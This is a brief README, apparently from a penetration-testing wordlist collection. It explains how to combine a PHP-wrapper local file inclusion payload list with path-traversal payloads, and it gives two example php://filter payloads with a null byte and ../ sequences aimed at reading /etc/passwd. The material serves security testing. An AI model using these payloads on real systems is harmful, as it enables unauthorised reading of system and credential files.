# LFI PHP wrapper 

For more comprehensive testing, the payload list given in `LFI-PHP-wrapper.txt` can be modified by replacing the common filenames (`index.php`, `/etc/passwd`) with those presented in dedicated LFI/path-traversal payload list (`LF.md`, etc.). This would effectively combine the capabilities of both wordlists.

Eg.

1. `php://filter/convert.base64-encode/resource=index.php` -> `php://filter/convert.base64-encode/resource=%00../../../../../../etc/passwd`
2. `php://filter/convert.base64-encode/resource=/etc/passwd` -> `php://filter/convert.base64-encode/resource=%00../../../../../../etc/passwd`
